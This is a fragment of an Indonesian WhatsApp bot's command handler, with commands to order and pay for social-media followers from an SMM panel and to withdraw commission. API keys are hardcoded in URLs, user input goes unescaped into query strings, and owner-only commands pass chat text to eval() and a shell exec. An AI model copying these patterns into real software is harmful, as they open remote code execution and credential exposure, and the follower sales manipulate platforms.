  				let cap = `Hay *${m.pushName} 👋,* Terimakasih Telah Order di Sosmed Shop!\nScan QR diatas untuk membayar! MENGGUNAKAN QRIS.\n\n*Id Pesanan Anda :* ${feta.data.order_id}\n*Target :* ${targ}\n*Jumlah Pesanan :* ${jumlah}\n*Total Harga Pesanan :* Rp ${feta.data.amount}\n*Status Orderan :* ${feta.data.status}\n\n_Info lebih lanjut klik button dibawah._`
  				buto = [{
    				buttonId: `cekstatus ${feta.data.order_id}`,
    				buttonText: {
      				displayText: 'Check Status'
    				},
    				type: 1
  				}]
  				Manik.sendMessage(from, {
    				caption: cap, image: {
      				url: feta.data.qris
    				}, buttons: buto, footer: `©AryaManik\nAffis Junianto`
  				})
				}
				console.log(feta)
				}
				break
case prefix+'listharga':
			case prefix+'prichlist':
			case prefix+'pricelist': {
				feta = await fetchJson(`https://ampibismm.my.id/api/json?bot=true&api_key=manikbot&action=pricelist&type=semua`)
				list = '*List Harga Layanan*\n\n'
				for (let L of feta.data) {
 				 list += `name : ${L.nama}\ndesc : ${L.desc}\nmin : ${L.min}\nmax : ${L.max}\nharga : ${L.price}\nid : ${L.id_layanan}\n\n`
				}
				Manik.sendMessage(from, {text: list}, {quoted:m})
				console.log(feta)
				}
				break
case 'chekstatus':
			case 'cekstatus': {
				if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
				if (args.length < 1) return m.reply('idnya mana bang')
				seta = await fetchJson(`https://ampibismm.my.id/api/json?bot=true&api_key=manikbot&action=status&order_id=${q}`)
				//console.log(seta)
				if (seta.status == false) {
  				var captionnye = `\nid order tidak di temukan`
				} else {
  				var captionnye = `\n*Status Orderan Anda*\n\nTarget : ${seta.data.target}\nStatus : ${seta.data.status}\nFollowers Default : ${seta.data.start_count}\nOn Process : ${seta.data.kurang}\nTotal Order : ${seta.data.total_order}\nTanggal Pesan : ${seta.data.tanggal_pesan}\nJumlah Pembayaran : ${seta.data.amount}\nId Pesanan : ${seta.data.order_id}\n\nTerimakasih sudah membeli followers dari kami, ditunggu next ordernya!`
				}
				var copynye = `${q}`
				const menuButa = [{
  				index: 1,
  				urlButton: {
    				displayText: `Copy Id Here`,
    				url: 'https://www.whatsapp.com/otp/copy/'+copynye
  				}},
				{urlButton: {
    				displayText: `Panel Smm`,
    				url: 'https://ampibismm.my.id'
  				}},
  				{
    				quickReplyButton: {
      				displayText: `Check Status Again`,
      			id: `cekstatus ${q}`
    				}
  				},
				]
				await Manik.sendMessage(from, {
  				text: `${captionnye}`, templateButtons: menuButa, footer: `Copy id pesanan anda dibawah ini\n\nampibismm.my.id\n©AryaManik`
				}, {
  				quoted: m
				})
				}
				break
			case prefix+'komisi':
				if (!isManik) return reply('Manik Aja')
				komisi = await fetchJson(`http://ampibismm.my.id/api/json?bot=true&action=profile&api_key=aryamanik`)
				let reskomisi = `Hallo owner Berikut komisi anda\n\n*Name :* ${komisi.data.name}\n*Full Name :* ${komisi.data.full_name}\n*Komisi :* ${komisi.data.komisi}`
				Manik.sendMessage(from, {text: reskomisi }, {quoted:fake})
				break
			case prefix+'tk': case prefix+'tarikkomisi': {
				if (!isManik) return reply('Manik Aja')
				//if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
				if (args.length < 1) return m.reply(`jumlahnya berapa? min 10000`)
				fetaa = await fetchJson(`https://ampibismm.my.id/api/json?bot=true&api_key=manikbot&action=listwallet`)
				list = []
					for (let L of fetaa.data) {
					let no = 1
					list.push({
    					buttonText: {displayText: L.wallet},
    					buttonId: `${prefix}tarikkomisikunci ${q}|${L.wallet}`,
    					type: `${no++}`
  					})
				}
				let nyobb = list
				Manik.sendMessage(from, {text:`*PILLIH E-WALLET*\nPilih jenis wallet yang ingin anda gunakan!`, title: 'WALLET', footer: '©AryaManik', buttons: nyobb})
				}
				break
			case prefix+'tarikkomisikunci':
				if (!isManik) return reply('Manik Aja')
				if (args.length < 1) return m.reply('jumlahnya berapa bang')
				let juml = q.split('|')[0] ? q.split('|')[0]: q
				let walle = q.split('|')[1] ? q.split('|')[1]: ''
				if (walle.length < 1) return m.reply(`Jumlah dan Target harus di isi!`)
				tarikom = await fetchJson(`https://ampibismm.my.id/api/json?bot=true&api_key=manikbot&action=withdraw&amount=${juml}&wallet=${walle}&nomor=${smm.nomor}&an=${smm.atasnama}`)
				Manik.sendMessage(from, {text: `${tarikom.data.msg}`}, {quoted:m})
				break

//================================>ADD FITUR BY MANIK<================================//

default:
if (isSami && body != undefined){
const simik = await fetchJson(`https://simsimi.info/api/?text=${chath}&lc=id`)
reply(simik.message)
          }
	/*if (isCmd) {		
		            reply(`Maaf kak fitur ${command} tidak terdaftar di list ${prefix+'menu'}`)
		          }*/
		

if (budy.startsWith('=>')) {
if (!isManik) return m.reply(mess.owner)
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return m.reply(bang)
}
try {
reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
m.reply(String(e))
}
}

if (budy.startsWith('>')) {
if (!isManik) return m.reply(mess.owner)
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}
}
if (budy.startsWith('<')) {
if (!isManik) return m.reply(mess.owner)
exec(budy.slice(2), (err, stdout) => {
if(err) return m.reply(err)
if (stdout) return m.reply(stdout)
})
}
if (m.chat.endsWith('@s.whatsapp.net') && isCmd) {
this.anonymous = this.anonymous ? this.anonymous : {}
let room = Object.values(this.anonymous).find(room => [room.a, room.b].includes(m.sender) && room.state === 'CHATTING')
if (room) {
if (/^.*(next|leave|start)/.test(m.text)) return
if (['.next', '.leave', '.stop', '.start', 'Cari Partner', 'Keluar', 'Lanjut', 'Stop'].includes(m.text)) return
let other = [room.a, room.b].find(user => user !== m.sender)
m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
contextInfo: {
...m.msg.contextInfo,
forwardingScore: 0,
isForwarded: true,
participant: other
}
} : {})
}
return !0
}
if (isCmd && budy.toLowerCase() != undefined) {
if (m.chat.endsWith('broadcast')) return
if (m.isBaileys) return
let msgs = global.db.database
if (!(budy.toLowerCase() in msgs)) return
Manik.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
}
}
} catch (err) {
let eror = JSON.parse(fs.readFileSync('./error.json'))
eror.push(`${util.format(err)}`)
fs.writeFileSync('./error.json', JSON.stringify(eror))
}
} 